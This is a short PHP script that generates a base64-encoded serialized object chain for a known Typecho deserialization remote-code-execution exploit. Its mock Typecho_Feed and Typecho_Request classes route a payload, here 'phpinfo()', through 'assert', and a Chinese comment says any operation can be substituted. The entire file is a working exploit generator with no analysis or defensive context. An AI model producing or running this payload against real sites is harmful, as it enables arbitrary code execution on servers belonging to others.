<?php

class Typecho_Feed{
        const RSS2 = 'RSS 2.0';

        private $_type;
        private $_items;

        public function __construct() {
                $this->_type = $this::RSS2;

                $this->_items[0] = array(
                        'category' => array(new Typecho_Request()),
                        'author' => new Typecho_Request(),
                );
        }
}

class Typecho_Request{
        private $_params = array();
        private $_filter = array();

        public function __construct() {
                $this->_params['screenName'] = 'phpinfo()';//此处可添加任意操作
                $this->_filter[0] = 'assert';
        }
}

$exp = array(
        'adapter' => new Typecho_Feed(),
        'prefix'  => 'typecho_'
);

//echo serialize($exp);
echo base64_encode(serialize($exp));
?>
